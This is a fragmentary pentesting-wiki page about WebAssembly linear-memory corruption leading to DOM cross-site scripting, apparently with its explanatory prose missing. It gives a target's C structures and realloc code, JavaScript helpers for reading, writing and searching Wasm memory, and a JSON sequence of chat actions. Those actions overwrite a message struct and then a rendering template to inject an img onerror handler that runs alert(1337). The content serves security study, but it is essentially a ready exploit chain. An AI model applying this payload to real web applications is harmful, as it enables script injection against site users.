---
title: "Wasm Linear Memory Template Overwrite Xss"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/pentesting-web/xss-cross-site-scripting/wasm-linear-memory-template-overwrite-xss.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: web
---

%.*s

# WebAssembly linear memory corruption to DOM XSS (template overwrite)

```
typedef struct msg {
    char *msg_data;       // pointer to message bytes
    size_t msg_data_len;  // length after sanitization
    int msg_time;         // timestamp
    int msg_status;       // flags
} msg;
typedef struct stuff {
    msg *mess;            // dynamic array of msg
    size_t size;          // used
    size_t capacity;      // allocated
} stuff; // global chat state in linear memory
```
```
int add_msg_to_stuff(stuff *s, msg new_msg) {
    if (s->size >= s->capacity) {
        s->capacity *= 2;
        s->mess = (msg *)realloc(s->mess, s->capacity * sizeof(msg));
        if (s->mess == NULL) exit(1);
    }
    s->mess[s->size++] = new_msg;
    return s->size - 1;
}
```
```
function writeBytes(ptr, byteArray){
  if(!Array.isArray(byteArray)) throw new Error("byteArray must be an array of numbers");
  for(let i=0;i<byteArray.length;i++){
    const byte = byteArray[i];
    if(typeof byte!=="number"||byte<0||byte>255) throw new Error(`Invalid byte at index ${i}: ${byte}`);
    HEAPU8[ptr+i]=byte;
  }
}
function readBytes(ptr,len){ return Array.from(HEAPU8.subarray(ptr,ptr+len)); }
function readBytesAsChars(ptr,len){
  const bytes=HEAPU8.subarray(ptr,ptr+len);
  return Array.from(bytes).map(b=>(b>=32&&b<=126)?String.fromCharCode(b):'.').join('');
}
function searchWasmMemory(str){
  const mem=Module.HEAPU8, pat=new TextEncoder().encode(str);
  for(let i=0;i<mem.length-pat.length;i++){
    let ok=true; for(let j=0;j<pat.length;j++){ if(mem[i+j]!==pat[j]){ ok=false; break; } }
    if(ok) console.log(`Found "${str}" at memory address:`, i);
  }
  console.log(`"${str}" not found in memory`);
  return -1;
}
const a = bytes => bytes.reduce((acc, b, i) => acc + (b << (8*i)), 0); // little-endian bytes -> int
```
```
[
  {"action":"add","content":"hi","time":1756840476392},
  {"action":"add","content":"hi","time":1756840476392},
  {"action":"add","content":"hi","time":1756840476392},
  {"action":"add","content":"hi","time":1756840476392},
  {"action":"add","content":"hi","time":1756840476392},
  {"action":"add","content":"hi","time":1756840476392},
  {"action":"add","content":"hi","time":1756840476392},
  {"action":"add","content":"hi","time":1756840476392},
  {"action":"add","content":"hi","time":1756840476392},
  {"action":"add","content":"hi","time":1756840476392},
  {"action":"add","content":"hi","time":1756840476392},
  {"action":"edit","msgId":10,"content":"aaaaaaaaaaaaaaaa.\u0000\u0001\u0000\u0050","time":1756885686080},
  {"action":"edit","msgId":0,"content":"img src=1      onerror=%.*s ","time":1756885686080},
  {"action":"add","content":"alert(1337)","time":1756840476392}
]
```
## References
